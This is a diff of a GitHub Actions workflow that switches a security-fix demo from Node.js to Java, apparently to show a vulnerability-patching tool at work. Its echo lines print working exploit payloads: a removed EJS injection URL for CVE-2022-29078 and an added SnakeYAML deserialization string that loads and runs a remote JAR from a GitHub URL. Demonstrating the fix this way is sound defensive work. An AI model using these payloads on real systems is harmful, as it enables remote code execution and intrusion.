@@ -22,38 +22,39 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Use Node.js
-        uses: actions/setup-node@v4
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
         with:
-          node-version: lts/*
+          distribution: 'temurin'
+          java-version: '17'
 
-      - name: Install Dependencies
-        run: npm install --no-audit
+      - name: Download Dependencies
+        run: mvn dependency:resolve -B
 
       - name: Seal Security - Fix Vulnerabilities
         uses: seal-community/cli-action@latest
         with:
           mode: fix
           fix_mode: ${{ github.event.inputs.fix_mode || 'remote' }}
-          target: package.json
+          target: pom.xml
           token: ${{ secrets.SEAL_TOKEN }}
         env:
           SEAL_SNYK_URL: "https://api.snyk.io"
           SEAL_SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
           SEAL_SNYK_ORG_ID: "bf279eb4-3b32-4731-ba49-ea7588371789"
-          SEAL_SNYK_PROJECT_ID: "ef1d0e3a-d815-440b-8d73-dc59f4778fdd"
+          SEAL_SNYK_PROJECT_ID: "5193ce84-979c-4dba-9efc-74ff35dd920f"
+
+      - name: Build Application
+        run: mvn package -DskipTests -B
 
       - name: Start Application
         run: |
           wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
           tar xzf ngrok-v3-stable-linux-amd64.tgz
           ./ngrok config add-authtoken ${{ secrets.NGROK_TOKEN }}
-          ./ngrok http --url=sealtest.ngrok.dev 3001 &
+          ./ngrok http --url=sealtest2.ngrok.dev 8080 &
           sleep 3
-          echo "App:     https://sealtest.ngrok.dev"
-          echo ""
-          echo "Normal:  https://sealtest.ngrok.dev/?name=alice"
-          echo "Exploit: https://sealtest.ngrok.dev/?name=Hacker&settings[view%20options][outputFunctionName]=x;setTimeout(function()%7Bprocess.exit(1)%7D,500);s"
-          echo ""
-          echo "Paste the exploit URL in the browser to test CVE-2022-29078"
-          npm run start
+          echo "App:     https://sealtest2.ngrok.dev"
+          echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar\"]]]]" 
+          echo "Paste the payload into the name field and click Go"
+          java -jar target/maven-demo-1.0.0.jar
